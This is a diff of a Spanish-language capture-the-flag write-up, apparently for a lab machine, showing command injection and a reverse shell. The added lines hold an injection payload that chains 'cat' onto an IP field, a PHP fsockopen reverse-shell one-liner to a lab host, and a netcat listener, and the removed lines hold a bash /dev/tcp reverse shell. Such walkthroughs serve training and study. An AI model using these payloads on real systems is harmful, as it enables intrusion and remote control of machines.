@@ -76,6 +76,10 @@ Hay inyección de comandos, por lo que podemos mirar archivos como el usuario we
 
 <img width="1379" height="852" alt="6encontramos" src="https://github.com/user-attachments/assets/e2735431-3bf7-4db4-acc9-68a0e9e62059" />
 Entramos al directorio del usuario web-admin para leer la flag del usuario.
+```bash
+127.0.0.1 ;  cat /home/web-admin/user.txt
+```
+
 <img width="1506" height="885" alt="7flagusuario" src="https://github.com/user-attachments/assets/c1d26f07-a1b5-41f8-bbe6-8358db60f015" />
 
 La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.
@@ -88,9 +92,9 @@ La flag es correcta, vamos a continuar obtenido una consola más interactiva par
 ### Intrusión (Reverse Shell)
 Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:
 
-```bash
-# Comando ejecutado en la máquina víctima
-bash -c 'bash -i >& /dev/tcp/10.10.X.X/4444 0>&1'
+```php
+# Comando ejecutado en el navegador web
+php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
 ```
 
 <img width="1372" height="821" alt="9revelsehell" src="https://github.com/user-attachments/assets/9bb10cb9-70d3-4eb2-a2d6-64e762e2ec23" />
@@ -99,7 +103,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.X.X/4444 0>&1'
 
 Ponemos nuestro *netcat* a la escucha para recibir la conexión:
 ```bash
-nc -nlvp 4444
+sudo nc -lvnp 440
 ```
 
 <img width="978" height="307" alt="10recibida" src="https://github.com/user-attachments/assets/f5b44944-fba7-4f5f-a727-f65fb4943e64" />
